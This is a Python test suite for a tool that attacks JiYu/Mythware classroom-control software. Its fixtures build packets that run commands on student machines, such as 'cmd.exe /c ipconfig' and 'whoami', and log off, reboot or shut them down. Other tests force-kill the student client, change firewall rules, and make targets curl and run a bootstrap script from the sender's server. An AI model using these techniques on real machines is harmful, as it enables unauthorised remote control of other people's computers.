"""核心模块的离线测试：报文构造、地址解析、本地信息与文件传送。"""

import io
import json
import shutil
import socket
import unittest
import urllib.request
from contextlib import redirect_stdout
from pathlib import Path
from threading import Event
from types import SimpleNamespace
from unittest.mock import MagicMock, call, patch

from app import core
from app.cli import main as cli


class CoreTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.test_root = Path("build") / "test-core-temp"
        cls.test_root.mkdir(parents=True, exist_ok=True)
        cls.core = core
        cls.real_socket = socket.socket
        cls.network_guard = patch.object(
            socket, "socket", side_effect=AssertionError("测试期间禁止创建网络套接字")
        )
        cls.network_guard.start()

    @classmethod
    def tearDownClass(cls):
        cls.network_guard.stop()

    def message_text(self, packet):
        body = bytes(packet[self.core.MESSAGE_OFFSET :]).decode("utf-16le")
        return body.split("\x00", 1)[0]

    def command_text(self, packet):
        body = bytes(packet[self.core.COMMAND_OFFSET :]).decode("utf-16le")
        return body.split("\x00", 1)[0]

    def test_message_chunks(self):
        for text, parts in [
            ("a" * 448, 1),
            ("a" * 449, 2),
            ("中文" * 224, 1),
            ("中文" * 225, 2),
            ("😀" * 224, 1),
            ("😀" * 225, 2),
        ]:
            with self.subTest(text_length=len(text)):
                chunks = list(self.core.split_message(text))
                self.assertEqual(len(chunks), parts)
                self.assertEqual("".join(chunks), text)
                for chunk in chunks:
                    packet = self.core.pkg_sendlist("-msg", chunk)
                    self.assertEqual(len(packet), 954)
                    self.assertEqual(self.message_text(packet), chunk)

    def test_message_keeps_multiline_content(self):
        text = "第一行\n\n第二行\r\n😀\t结束\n" * 100
        chunks = list(self.core.split_message(text))
        self.assertGreater(len(chunks), 1)
        self.assertEqual("".join(chunks), text)

    def test_templates_are_not_mutated(self):
        message_template = self.core.basicCMD["-msg"].copy()
        command_template = self.core.basicCMD["-c"].copy()
        first = self.core.pkg_sendlist("-msg", "第一条")
        second = self.core.pkg_sendlist("-msg", "另一条")
        command = self.core.pkg_sendlist("-c", "cmd.exe /c ipconfig")
        self.assertIsNot(first, second)
        self.assertEqual(self.message_text(first), "第一条")
        self.assertEqual(self.message_text(second), "另一条")
        self.assertEqual(self.command_text(command), "cmd.exe /c ipconfig")
        self.assertEqual(self.core.basicCMD["-msg"], message_template)
        self.assertEqual(self.core.basicCMD["-c"], command_template)

    def test_capacity_errors_are_explicit(self):
        with self.assertRaises(ValueError):
            list(self.core.split_message("a\x00b"))
        with self.assertRaises(ValueError):
            self.core.pkg_sendlist("-msg", "a" * 449)
        command_units = self.core.COMMAND_MAX_BYTES // 2
        with self.assertRaises(ValueError):
            self.core.pkg_sendlist("-c", "a" * (command_units + 1))

    def test_ip_formats(self):
        self.assertEqual(self.core.get_ip("192.168.1.10"), ["192.168.1.10"])
        self.assertEqual(
            self.core.get_ip("192.168.1.1-3")[:3],
            ["192.168.1.1", "192.168.1.2", "192.168.1.3"],
        )
        network = self.core.get_ip("192.168.1.0/24")
        self.assertEqual(len(network), 254)
        self.assertEqual(network[0], "192.168.1.1")
        self.assertEqual(network[-1], "192.168.1.254")

    def test_target_count_matches_expansion(self):
        for value in ["192.168.1.10", "192.168.1.1-3", "192.168.1.0/24", "10.0.0.5/24"]:
            with self.subTest(value=value):
                self.assertEqual(
                    self.core.count_targets(value), len(self.core.get_ip(value))
                )
        for value in [
            "",
            "bad-address",
            "192.168.1.10-1",
            "192.168.1.1-255",
            "10.0.0.0/16",
        ]:
            with self.subTest(value=value), self.assertRaises(ValueError):
                self.core.count_targets(value)

    def test_options_validation(self):
        good = self.core.SendOptions("192.168.1.10", message="通知")
        self.core.validate_options(good)
        self.core.validate_options(self.core.SendOptions("192.168.1.10", extra="l"))
        bad_cases = [
            self.core.SendOptions("", message="通知"),
            self.core.SendOptions("bad-address", message="通知"),
            self.core.SendOptions("192.168.1.10"),
            self.core.SendOptions("192.168.1.10", port=0, message="通知"),
            self.core.SendOptions("192.168.1.10", loops=0, message="通知"),
            self.core.SendOptions("192.168.1.10", interval=-1, message="通知"),
            self.core.SendOptions("192.168.1.10", message="通知", extra="nc"),
        ]
        for options in bad_cases:
            with self.subTest(options=options), self.assertRaises(ValueError):
                self.core.validate_options(options)

    def test_packet_preparation(self):
        options = self.core.SendOptions(
            "192.168.1.10", message="a" * 449, command="whoami"
        )
        packets = self.core.prepare_packets(options)
        self.assertEqual(len(packets), 3)
        self.assertEqual(
            self.message_text(packets[0]) + self.message_text(packets[1]), "a" * 449
        )
        self.assertEqual(self.command_text(packets[2]), "whoami")

        options.extra = "s"
        packets = self.core.prepare_packets(options)
        self.assertIsNot(packets[-1], self.core.basicCMD["-s"])

        packets = self.core.prepare_packets(
            self.core.SendOptions("192.168.1.10", extra="l")
        )
        self.assertEqual(len(packets), 1)
        self.assertEqual(self.command_text(packets[0]), self.core.LOGOFF_COMMAND)

    def test_cli_device_actions_reuse_fixed_templates(self):
        parser = cli.build_parser()
        for extra, key in (("r", "-r"), ("s", "-s")):
            with self.subTest(extra=extra):
                arguments = parser.parse_args(["-ip", "192.168.1.10", "-e", extra])
                packets = cli.create_send_packets(arguments)
                self.assertEqual(packets, [self.core.basicCMD[key]])

        arguments = parser.parse_args(["-ip", "192.168.1.10", "-e", "l"])
        packets = cli.create_send_packets(arguments)
        self.assertEqual(self.command_text(packets[0]), self.core.LOGOFF_COMMAND)

    def test_invalid_reverse_range_is_rejected(self):
        for value in ["192.168.1.10-1", "192.168.1.0-10", "192.168.1.1-255"]:
            with self.subTest(value=value), self.assertRaises(ValueError):
                self.core.get_ip(value)

    def test_gui_send_uses_bytes_and_shared_transport(self):
        options = self.core.SendOptions(
            "192.168.1.10", message="a" * 449, command="whoami", loops=2, interval=0
        )
        first = MagicMock()
        second = MagicMock()
        packets = [
            bytes(self.core.pkg_sendlist("-msg", chunk))
            for chunk in self.core.split_message(options.message)
        ]
        packets.append(bytes(self.core.pkg_sendlist("-c", options.command)))
        with (
            patch.object(
                self.core.transport, "get_ip", return_value=["模拟目标甲", "模拟目标乙"]
            ),
            patch.object(socket, "socket", side_effect=[first, second]),
            patch.object(
                self.core.transport,
                "ping_hosts",
                return_value={"模拟目标甲": True, "模拟目标乙": True},
            ),
        ):
            outcome = self.core.execute_send_report(options)
        self.assertEqual(outcome.sent, 12)
        # 每个目标各自建连接，轮询两轮后各发一遍完整报文序列。
        for client, host in ((first, "模拟目标甲"), (second, "模拟目标乙")):
            self.assertEqual(client.connect.call_args, call((host, 4705)))
            self.assertEqual(
                client.send.call_args_list,
                [call(packet) for _ in range(2) for packet in packets],
            )
            client.close.assert_called_once()
        self.assertEqual(len(outcome.deliveries), 2)
        self.assertTrue(all(item.ok for item in outcome.deliveries))

    def test_cancellation_before_send_opens_no_socket(self):
        stopped = Event()
        stopped.set()
        options = self.core.SendOptions(
            "192.168.1.10", message="通知", cancel_event=stopped
        )
        with (
            patch.object(self.core.transport, "get_ip", return_value=["模拟目标"]),
            patch.object(socket, "socket") as factory,
            self.assertRaisesRegex(RuntimeError, "操作已取消"),
        ):
            self.core.execute_send(options)
        factory.assert_not_called()

    def test_cancellation_interrupts_long_interval(self):
        stopped = Event()
        options = self.core.SendOptions(
            "192.168.1.10", message="通知", loops=2, interval=3600, cancel_event=stopped
        )
        fake_socket = MagicMock()
        fake_socket.__enter__.return_value = fake_socket

        def report(message):
            if "轮已发送" in message:
                stopped.set()

        with (
            patch.object(self.core.transport, "get_ip", return_value=["模拟目标"]),
            patch.object(socket, "socket", return_value=fake_socket),
            self.assertRaisesRegex(RuntimeError, "操作已取消"),
        ):
            self.core.execute_send(options, report)
        fake_socket.send.assert_called_once()
        fake_socket.close.assert_called_once()

    def test_send_error_closes_socket(self):
        fake_socket = MagicMock()
        fake_socket.__enter__.return_value = fake_socket
        fake_socket.sendto.side_effect = OSError("模拟发送失败")
        with (
            patch.object(self.core.transport, "get_ip", return_value=["模拟目标"]),
            patch.object(socket, "socket", return_value=fake_socket),
            self.assertRaisesRegex(OSError, "模拟发送失败"),
        ):
            self.core.send([[1, 2, 3]], "模拟目标")
        fake_socket.__exit__.assert_called_once()

    def test_send_tracked_marks_rejected_and_unreachable_targets(self):
        rejected = MagicMock()
        rejected.send.side_effect = ConnectionResetError("端口不可达")
        unreachable = MagicMock()
        unreachable.connect.side_effect = OSError("网络不可达")
        with (
            patch.object(self.core.transport, "get_ip", return_value=["甲", "乙"]),
            patch.object(socket, "socket", side_effect=[rejected, unreachable]),
        ):
            outcome = self.core.send_tracked([[1, 2, 3]], "模拟目标", interval=0)
        self.assertEqual(outcome.sent, 0)
        self.assertEqual(
            [item.state for item in outcome.deliveries],
            [self.core.DeliveryState.REJECTED, self.core.DeliveryState.UNREACHABLE],
        )
        self.assertEqual(outcome.failed, outcome.deliveries)

    def test_send_tracked_confirms_silent_targets_with_echo(self):
        client = MagicMock()
        with (
            patch.object(self.core.transport, "get_ip", return_value=["10.0.0.5"]),
            patch.object(socket, "socket", return_value=client),
            patch.object(
                self.core.transport, "ping_hosts", return_value={"10.0.0.5": True}
            ),
        ):
            outcome = self.core.send_tracked([[1], [2]], "模拟目标", interval=0)
        self.assertEqual(outcome.sent, 2)
        self.assertTrue(outcome.deliveries[0].ok)
        self.assertEqual(outcome.failed, ())

    def test_reachability_ignores_addresses_it_cannot_probe(self):
        self.assertEqual(self.core.reachability.ping_hosts([]), {})
        self.assertEqual(self.core.reachability.ping_hosts(["not-an-address"]), {})

    def test_send_tracked_reports_targets_that_never_answer(self):
        client = MagicMock()
        with (
            patch.object(self.core.transport, "get_ip", return_value=["10.0.0.6"]),
            patch.object(socket, "socket", return_value=client),
            patch.object(
                self.core.transport, "ping_hosts", return_value={"10.0.0.6": False}
            ),
        ):
            outcome = self.core.send_tracked([[1]], "模拟目标", interval=0)
        self.assertEqual(
            [item.state for item in outcome.deliveries],
            [self.core.DeliveryState.NO_RESPONSE],
        )
        self.assertEqual(outcome.deliveries[0].state.text, "失败：目标未响应")

    def test_local_ports_match_exact_pids_and_wildcard_addresses(self):
        tasks = SimpleNamespace(
            returncode=0,
            stderr="",
            stdout='"StudentMain.exe","123"\n"other.exe","5123"\n',
        )
        ports = SimpleNamespace(
            returncode=0,
            stderr="",
            stdout="UDP 0.0.0.0:4705 *:* 123\n"
            "UDP [::]:4705 *:* 123\n"
            "UDP 0.0.0.0:9999 *:* 5123\n",
        )
        with (
            patch.object(
                self.core.local_info, "run_windows_command", side_effect=[tasks, ports]
            ),
            patch.object(socket, "gethostbyname", return_value="192.168.50.22"),
        ):
            ip, result = self.core.local_ip_and_ports()
        self.assertEqual(ip, "192.168.50.22")
        self.assertEqual(result, ["4705"])

    def test_local_ip_and_ports_skips_unreachable_hostname_address(self):
        tasks = SimpleNamespace(returncode=0, stderr="", stdout="")
        with (
            patch.object(
                self.core.local_info, "run_windows_command", side_effect=[tasks]
            ),
            patch.object(socket, "gethostbyname", return_value="198.18.0.3"),
            patch.object(
                self.core.local_info, "detect_local_ip", return_value="192.168.50.22"
            ) as detect,
        ):
            ip, result = self.core.local_ip_and_ports()
        detect.assert_called_once_with()
        self.assertEqual(ip, "192.168.50.22")
        self.assertEqual(result, [])

    def test_udp_port_owners_lists_other_processes_on_the_port(self):
        connections = SimpleNamespace(
            returncode=0,
            stderr="",
            stdout="UDP 192.168.50.22:4705 *:* 17600\n"
            "UDP 0.0.0.0:4705 *:* 9001\n"
            "UDP 0.0.0.0:6536 *:* 9002\n",
        )
        tasks = SimpleNamespace(
            returncode=0,
            stderr="",
            stdout='"StudentMain.exe","17600"\n"JiYuAttackNext.exe","9001"\n',
        )
        with patch.object(
            self.core.local_info,
            "run_windows_command",
            side_effect=[connections, tasks],
        ):
            owners = self.core.local_info.udp_port_owners(4705, exclude_pids=(9001,))
        self.assertEqual(
            owners,
            [
                {
                    "address": "192.168.50.22:4705",
                    "pid": 17600,
                    "name": "StudentMain.exe",
                }
            ],
        )

    def _install_dir(self, with_library=True):
        """建一个临时的学生端目录，按需放入 LibTDMaster.dll。"""
        directory = self.test_root / "mythware"
        directory.mkdir(parents=True, exist_ok=True)
        exe = directory / "StudentMain.exe"
        exe.write_bytes(b"MZ")
        library = directory / "LibTDMaster.dll"
        if with_library:
            library.write_bytes(b"MZ")
        elif library.exists():
            library.unlink()
        return exe

    def test_find_student_processes_reports_listening_ports(self):
        exe = self._install_dir()
        tasks = SimpleNamespace(
            returncode=0,
            stderr="",
            stdout='"StudentMain.exe","17600"\n"explorer.exe","9002"\n',
        )
        udp = SimpleNamespace(
            returncode=0, stderr="", stdout="UDP 192.168.50.22:4705 *:* 17600\n"
        )
        tcp = SimpleNamespace(
            returncode=0,
            stderr="",
            stdout="TCP 192.168.50.22:51767 0.0.0.0:0 LISTENING 17600\n",
        )
        paths = SimpleNamespace(returncode=0, stderr="", stdout="17600|%s\n" % exe)
        with patch.object(
            self.core.student_process,
            "run_windows_command",
            side_effect=[tasks, udp, tcp, paths],
        ):
            processes = self.core.find_student_processes()
        self.assertEqual(
            processes,
            [
                {
                    "pid": 17600,
                    "name": "StudentMain.exe",
                    "ports": [4705, 51767],
                    "path": str(exe),
                    "genuine": True,
                }
            ],
        )

    def test_find_student_processes_marks_decoy_without_library(self):
        exe = self._install_dir(with_library=False)
        tasks = SimpleNamespace(
            returncode=0, stderr="", stdout='"StudentMain.exe","17600"\n'
        )
        ports = SimpleNamespace(returncode=0, stderr="", stdout="")
        paths = SimpleNamespace(returncode=0, stderr="", stdout="17600|%s\n" % exe)
        with patch.object(
            self.core.student_process,
            "run_windows_command",
            side_effect=[tasks, ports, ports, paths],
        ):
            processes = self.core.find_student_processes()
        self.assertFalse(processes[0]["genuine"])

    def test_stop_student_processes_escalates_from_graceful_to_force(self):
        outcomes = [
            {
                "pid": 17600,
                "code": 5,
                "output": "拒绝访问",
                "success": False,
                "forced": False,
            },
            {
                "pid": 17600,
                "code": 0,
                "output": "成功",
                "success": True,
                "forced": True,
            },
        ]
        with (
            patch.object(
                self.core.student_process, "_taskkill", side_effect=outcomes
            ) as taskkill,
            patch.object(
                self.core.student_process, "_wait_gone", side_effect=[False, True]
            ),
            patch.object(self.core.student_process, "_pid_alive", return_value=False),
            patch.object(
                self.core.student_process, "find_student_processes", return_value=[]
            ),
            patch.object(self.core.student_process, "_is_admin", return_value=True),
        ):
            results = self.core.stop_student_processes([17600])
        self.assertEqual(
            [item.kwargs["force"] for item in taskkill.call_args_list], [False, True]
        )
        self.assertTrue(results[0]["success"])
        self.assertTrue(results[0]["forced"])
        self.assertTrue(results[0]["gone"])

    def test_terminate_escalates_when_graceful_signal_leaves_it_running(self):
        # 极域学生端不响应正常退出，taskkill 不加 /F 也返回成功，要靠存活检查升级。
        graceful = {
            "pid": 17600,
            "code": 0,
            "output": "成功: 给进程发送了终止信号",
            "success": True,
            "forced": False,
        }
        forced = {
            "pid": 17600,
            "code": 0,
            "output": "成功: 已终止",
            "success": True,
            "forced": True,
        }
        with (
            patch.object(
                self.core.student_process, "_taskkill", side_effect=[graceful, forced]
            ) as taskkill,
            patch.object(
                self.core.student_process, "_wait_gone", side_effect=[False, True]
            ),
        ):
            outcome = self.core.student_process._terminate(17600)
        self.assertEqual(
            [item.kwargs["force"] for item in taskkill.call_args_list], [False, True]
        )
        self.assertTrue(outcome["success"])
        self.assertTrue(outcome["gone"])

    def test_stop_student_processes_reports_respawned_student(self):
        respawn = {
            "pid": 19000,
            "name": "StudentMain.exe",
            "ports": [4705],
            "path": "",
            "genuine": False,
        }
        outcome = {
            "pid": 17600,
            "code": 0,
            "output": "成功",
            "success": True,
            "forced": True,
        }
        with (
            patch.object(self.core.student_process, "_taskkill", return_value=outcome),
            patch.object(self.core.student_process, "_wait_gone", return_value=True),
            patch.object(self.core.student_process, "_pid_alive", return_value=False),
            patch.object(
                self.core.student_process,
                "find_student_processes",
                side_effect=[[respawn]],
            ),
            patch.object(self.core.student_process, "_is_admin", return_value=True),
        ):
            results = self.core.stop_student_processes([17600])
        self.assertEqual(len(results), 2)
        self.assertTrue(results[0]["success"])
        self.assertTrue(results[1]["respawned"])
        self.assertFalse(results[1]["success"])
        self.assertIn("守护服务", results[1]["output"])

    def test_find_student_executable_uses_service_directory(self):
        root = Path(self.test_root)
        service_dir = root / "Mythware"
        service_dir.mkdir(exist_ok=True)
        exe = service_dir / "StudentMain.exe"
        exe.write_text("", encoding="utf-8")
        plain = str(service_dir / "GATESRV.exe")
        services = SimpleNamespace(
            returncode=0,
            stderr="",
            stdout=plain + chr(10),
        )
        with (
            patch.object(
                self.core.student_process, "find_student_processes", return_value=[]
            ),
            patch.object(self.core.student_process, "_uninstall_icon", return_value=[]),
            patch.object(
                self.core.student_process, "_registered_directories", return_value=[]
            ),
            patch.object(
                self.core.student_process,
                "run_windows_command",
                return_value=services,
            ),
        ):
            found = self.core.student_process.find_student_executable()
        self.assertEqual(found, str(exe.resolve()))

    def test_elevated_helper_uses_module_entry_when_not_frozen(self):
        seen = {}

        def fake(executable, parameters, directory=None, action=""):
            seen["executable"] = executable
            seen["parameters"] = parameters
            seen["directory"] = directory
            seen["action"] = action
            return 1

        with (
            patch.object(self.core.firewall, "_run_elevated_process", side_effect=fake),
            patch.object(self.core.firewall, "sys") as fake_sys,
        ):
            fake_sys.platform = "win32"
            fake_sys.executable = "python.exe"
            fake_sys.frozen = False
            with self.assertRaises(RuntimeError):
                self.core.student_process._run_student_elevated("17600")
        self.assertTrue(seen["parameters"].startswith("-m app"))
        self.assertTrue(seen["parameters"].endswith(".json"))
        self.assertEqual(
            Path(seen["directory"]).name,
            Path(self.core.student_process.__file__).parents[2].name,
        )

    def test_toggle_student_process_follows_running_state(self):
        record = {
            "pid": 17600,
            "name": "StudentMain.exe",
            "ports": [4705],
            "path": "",
            "genuine": False,
        }
        with (
            patch.object(
                self.core.student_process,
                "find_student_processes",
                return_value=[record],
            ),
            patch.object(
                self.core.student_process,
                "stop_student_processes",
                return_value=[{"pid": 17600, "success": True}],
            ) as stop,
        ):
            stopped = self.core.toggle_student_process()
        self.assertEqual(stopped["action"], "stop")
        self.assertEqual(stop.call_args.args, ([17600],))
        with (
            patch.object(
                self.core.student_process, "find_student_processes", return_value=[]
            ),
            patch.object(
                self.core.student_process,
                "start_student_process",
                return_value=[{"path": "C:/x/StudentMain.exe", "success": True}],
            ) as start,
        ):
            started = self.core.toggle_student_process("C:/x/StudentMain.exe")
        self.assertEqual(started["action"], "start")
        self.assertEqual(start.call_args.args, ("C:/x/StudentMain.exe",))

    def test_find_student_executable_prefers_genuine_running_process(self):
        genuine = self._install_dir()
        decoy_dir = self.test_root / "decoy"
        decoy_dir.mkdir(parents=True, exist_ok=True)
        decoy = decoy_dir / "StudentMain.exe"
        decoy.write_bytes(b"MZ")
        records = [
            {"pid": 100, "name": "StudentMain.exe", "ports": [], "path": str(decoy)},
            {
                "pid": 200,
                "name": "StudentMain.exe",
                "ports": [],
                "path": str(genuine),
            },
        ]
        with patch.object(
            self.core.student_process, "find_student_processes", return_value=records
        ):
            located = self.core.find_student_executable()
        self.assertEqual(located, str(genuine))

    def test_stop_student_processes_rejects_missing_targets(self):
        tasks = SimpleNamespace(
            returncode=0, stderr="", stdout='"explorer.exe","9002"\n'
        )
        with (
            patch.object(
                self.core.student_process, "run_windows_command", return_value=tasks
            ),
            self.assertRaises(RuntimeError),
        ):
            self.core.stop_student_processes()
        with self.assertRaises(ValueError):
            self.core.stop_student_processes(["not-a-pid"])

    def test_student_helper_rejects_bad_arguments(self):
        self.assertEqual(self.core.run_student_helper([]), 2)
        self.assertEqual(self.core.run_student_helper(["17600", "--student-result"]), 2)

    def test_start_student_process_needs_existing_executable(self):
        missing = self.test_root / "missing-StudentMain.exe"
        with (
            patch.object(
                self.core.student_process, "find_student_processes", return_value=[]
            ),
            self.assertRaises(RuntimeError) as raised,
        ):
            self.core.start_student_process(str(missing))
        self.assertIn("不存在", str(raised.exception))

    def test_start_student_process_refuses_second_instance(self):
        exe = self.test_root / "StudentMain.exe"
        exe.write_bytes(b"MZ")
        running = [{"pid": 17600, "name": "StudentMain.exe", "ports": [4705]}]
        with (
            patch.object(
                self.core.student_process,
                "find_student_processes",
                return_value=running,
            ),
            self.assertRaises(RuntimeError) as raised,
        ):
            self.core.start_student_process(str(exe))
        self.assertIn("已经有学生端在运行", str(raised.exception))

    def test_student_helper_starts_the_executable_and_reports_it(self):
        exe = self.test_root / "StudentMain.exe"
        exe.write_bytes(b"MZ")
        result_file = self.test_root / "student-start.json"
        result_file.unlink(missing_ok=True)
        launched = MagicMock(pid=4242)
        with patch.object(
            self.core.student_process.subprocess, "Popen", return_value=launched
        ) as popen:
            code = self.core.run_student_helper(
                ["start=" + str(exe), "--student-result", str(result_file)]
            )
        self.assertEqual(code, 0)
        self.assertEqual(popen.call_args.args[0], [str(exe)])
        payload = json.loads(result_file.read_text(encoding="utf-8"))
        self.assertEqual(payload["results"][0]["pid"], 4242)
        self.assertTrue(payload["results"][0]["success"])

    def test_windows_output_decoding_supports_utf8_and_gbk(self):
        self.assertEqual(
            self.core.firewall._decode_windows_output("规则已更新".encode("utf-8")),
            "规则已更新",
        )
        self.assertEqual(
            self.core.firewall._decode_windows_output("服务已在运行".encode("gbk")),
            "服务已在运行",
        )

    def test_firewall_running_service_exit_code_is_reported_as_success(self):
        responses = [
            SimpleNamespace(returncode=2, stdout="", stderr="请求的服务已经启动。"),
            SimpleNamespace(returncode=0, stdout="确定。", stderr=""),
            SimpleNamespace(returncode=0, stdout="已更新 6 规则。", stderr=""),
        ]
        with patch.object(
            self.core.firewall, "run_windows_command", side_effect=responses
        ) as command:
            results = self.core.set_firewall_rule("block")
        self.assertEqual(command.call_count, 3)
        self.assertEqual(results[0]["command"], "net.exe start MpsSvc")
        self.assertTrue(results[0]["success"])
        self.assertIn("原本已在运行", results[0]["stdout"])
        self.assertTrue(results[1]["success"])
        self.assertTrue(results[2]["success"])

    def test_firewall_rule_elevates_only_when_needed(self):
        results = [{"command": "netsh", "success": True}]
        with (
            patch.object(self.core.firewall.sys, "platform", "win32"),
            patch.object(self.core.firewall, "_is_admin", return_value=False),
            patch.object(
                self.core.firewall, "_run_firewall_elevated", return_value=results
            ) as elevated,
            patch.object(self.core.firewall, "set_firewall_rule") as local,
        ):
            self.assertIs(self.core.request_firewall_rule("block"), results)
        elevated.assert_called_once_with("block")
        local.assert_not_called()

    def test_firewall_rule_runs_locally_when_already_admin(self):
        results = [{"command": "netsh", "success": True}]
        with (
            patch.object(self.core.firewall.sys, "platform", "win32"),
            patch.object(self.core.firewall, "_is_admin", return_value=True),
            patch.object(
                self.core.firewall, "set_firewall_rule", return_value=results
            ) as local,
            patch.object(self.core.firewall, "_run_firewall_elevated") as elevated,
        ):
            self.assertIs(self.core.request_firewall_rule("allow"), results)
        local.assert_called_once_with("allow")
        elevated.assert_not_called()

    def test_firewall_helper_reports_results_and_errors(self):
        result_path = self.test_root / "firewall-helper.json"
        self.addCleanup(lambda: result_path.unlink(missing_ok=True))
        results = [{"command": "netsh", "success": True}]
        with patch.object(
            self.core.firewall, "set_firewall_rule", return_value=results
        ):
            code = self.core.run_firewall_helper(
                ["block", "--firewall-result", str(result_path)]
            )
        self.assertEqual(code, 0)
        self.assertEqual(
            json.loads(result_path.read_text(encoding="utf-8")), {"results": results}
        )
        with patch.object(
            self.core.firewall,
            "set_firewall_rule",
            side_effect=RuntimeError("权限不足"),
        ):
            code = self.core.run_firewall_helper(
                ["block", "--firewall-result", str(result_path)]
            )
        self.assertEqual(code, 1)
        self.assertEqual(
            json.loads(result_path.read_text(encoding="utf-8")), {"error": "权限不足"}
        )

    def test_firewall_helper_rejects_invalid_arguments(self):
        self.assertEqual(self.core.run_firewall_helper([]), 2)
        self.assertEqual(self.core.run_firewall_helper(["block"]), 2)

    def test_file_transfer_validation(self):
        directory = self.test_root / "validation"
        shutil.rmtree(directory, ignore_errors=True)
        directory.mkdir(parents=True)
        try:
            source = directory / "测试 文件.txt"
            source.write_bytes(b"hello")
            result = self.core.validate_file_transfer("192.168.1.10", 4705, str(source))
            self.assertEqual(result, source.resolve())
            self.assertEqual(
                self.core.validate_file_transfer("192.168.1.1-2", 4705, str(source)),
                source.resolve(),
            )
            self.assertEqual(
                self.core.validate_file_transfer("192.168.1.0/24", 4705, str(source)),
                source.resolve(),
            )
            with self.assertRaisesRegex(ValueError, "IP 格式错误"):
                self.core.validate_file_transfer("192.168.1.10-1", 4705, str(source))
            with self.assertRaisesRegex(ValueError, "文件不存在"):
                self.core.validate_file_transfer(
                    "192.168.1.10", 4705, str(source) + ".missing"
                )
            with self.assertRaisesRegex(ValueError, "文件"):
                self.core.validate_file_transfer("192.168.1.10", 4705, str(directory))
            with self.assertRaisesRegex(ValueError, "端口"):
                self.core.validate_file_transfer("192.168.1.10", 0, str(source))
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_file_transfer_supports_multiple_targets(self):
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        directory = self.test_root / "multi-target"
        shutil.rmtree(directory, ignore_errors=True)
        directory.mkdir(parents=True)
        try:
            source = directory / "payload.bin"
            payload = b"multi-mode-payload"
            source.write_bytes(payload)
            reported = []
            sent_hosts = []

            def fake_send(
                packets, target, port, loops, interval, report=None, cancel_event=None
            ):
                sent_hosts.append(target)
                command = (
                    bytes(packets[0][self.core.COMMAND_OFFSET :])
                    .decode("utf-16le")
                    .split("\x00", 1)[0]
                )
                bootstrap_url = command.split('-o "%TEMP%\\jyt.cmd" "', 1)[1].split(
                    '"', 1
                )[0]
                with urllib.request.urlopen(bootstrap_url, timeout=5) as response:
                    script = response.read().decode("utf-8-sig")
                file_url = script.split(
                    'curl.exe -fsSL --noproxy "*" --retry 2 -o "%PART%" "', 1
                )[1].split('"', 1)[0]
                with urllib.request.urlopen(file_url, timeout=5) as response:
                    self.assertEqual(response.read(), payload)
                return 1

            with patch.object(self.core.transport, "send", side_effect=fake_send):
                result = self.core.transfer_file(
                    "192.168.1.1-3",
                    4705,
                    str(source),
                    listen_ip="127.0.0.1",
                    timeout=5,
                    report=reported.append,
                )
            self.assertEqual(sent_hosts, ["192.168.1.1", "192.168.1.2", "192.168.1.3"])
            self.assertEqual(result["targets"], sent_hosts)
            self.assertEqual(result["transferred"], sent_hosts)
            self.assertIsNone(result["port"])
            self.assertTrue(any("全部 3 个目标" in message for message in reported))
            self.assertTrue(
                any("目标 2/3（192.168.1.2）" in message for message in reported)
            )
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_file_transfer_continues_after_one_target_fails(self):
        self.network_guard.stop()
        self.addCleanup(self.network_guard.start)
        directory = self.test_root / "multi-failure"
        shutil.rmtree(directory, ignore_errors=True)
        directory.mkdir(parents=True)
        try:
            source = directory / "payload.bin"
            source.write_bytes(b"partial-payload")
            requested = []

            def fake_send(
                packets, target, port, loops, interval, report=None, cancel_event=None
            ):
                if target.endswith(".1"):
                    return 1
                requested.append(target)
                command = (
                    bytes(packets[0][self.core.COMMAND_OFFSET :])
                    .decode("utf-16le")
                    .split("\x00", 1)[0]
                )
                bootstrap_url = command.split('-o "%TEMP%\\jyt.cmd" "', 1)[1].split(
                    '"', 1
                )[0]
                with urllib.request.urlopen(bootstrap_url, timeout=5) as response:
                    script = response.read().decode("utf-8-sig")
                file_url = script.split(
                    'curl.exe -fsSL --noproxy "*" --retry 2 -o "%PART%" "', 1
                )[1].split('"', 1)[0]
                with urllib.request.urlopen(file_url, timeout=5) as response:
                    self.assertEqual(response.read(), b"partial-payload")
                return 1

            with (
                patch.object(self.core.transport, "send", side_effect=fake_send),
                self.assertRaisesRegex(RuntimeError, "完成 1/2 个目标") as failure,
            ):
                self.core.transfer_file(
                    "192.168.1.1-2",
                    4705,
                    str(source),
                    listen_ip="127.0.0.1",
                    timeout=0.2,
                    attempts=1,
                    retry_delay=0,
                )
            self.assertIn("192.168.1.1", str(failure.exception))
            self.assertEqual(requested, ["192.168.1.2"])
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_file_transfer_cli_reports_multiple_targets(self):
        result = {
            "name": "report.pdf",
            "size": 10,
            "target": "192.168.1.1-2",
            "targets": ["192.168.1.1", "192.168.1.2"],
            "transferred": ["192.168.1.1", "192.168.1.2"],
            "listen_ip": "192.168.1.20",
            "port": None,
        }
        arguments = SimpleNamespace(
            ip="192.168.1.1-2",
            p=4705,
            file=["report.pdf"],
            file_ip=None,
            file_timeout=120,
        )
        buffer = io.StringIO()
        with (
            patch.object(cli, "transfer_file", return_value=result),
            redirect_stdout(buffer),
        ):
            self.assertEqual(cli.run_file_transfer(arguments), 0)
        self.assertIn("2 个目标桌面", buffer.getvalue())

    def test_collect_transfer_items_expands_folders(self):
        directory = self.test_root / "collect"
        shutil.rmtree(directory, ignore_errors=True)
        (directory / "包" / "子目录").mkdir(parents=True)
        try:
            (directory / "包" / "a.txt").write_text("a", encoding="utf-8")
            (directory / "包" / "子目录" / "b.bin").write_bytes(b"bb")
            (directory / "单.txt").write_text("c", encoding="utf-8")
            items = self.core.collect_transfer_items(
                [directory / "包", directory / "单.txt", directory / "包" / "a.txt"]
            )
            relatives = [relative for _, relative, _ in items]
            self.assertEqual(relatives, ["包/a.txt", "包/子目录/b.bin", "单.txt"])
            self.assertEqual([size for _, _, size in items], [1, 2, 1])
            with self.assertRaisesRegex(ValueError, "文件夹中没有可传送的文件"):
                empty = directory / "空"
                empty.mkdir()
                self.core.collect_transfer_items([empty])
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_bootstrap_script_restores_folder_structure(self):
        script = self.core.build_items_bootstrap_script(
            [("素材/说明.txt", 3), ("素材/第二章/示例.docx", 5)],
            ["http://192.168.1.10:1/f/t", "http://192.168.1.10:1/f/t/1"],
            desktop_dir=r"C:\Users\测试\Desktop",
        )
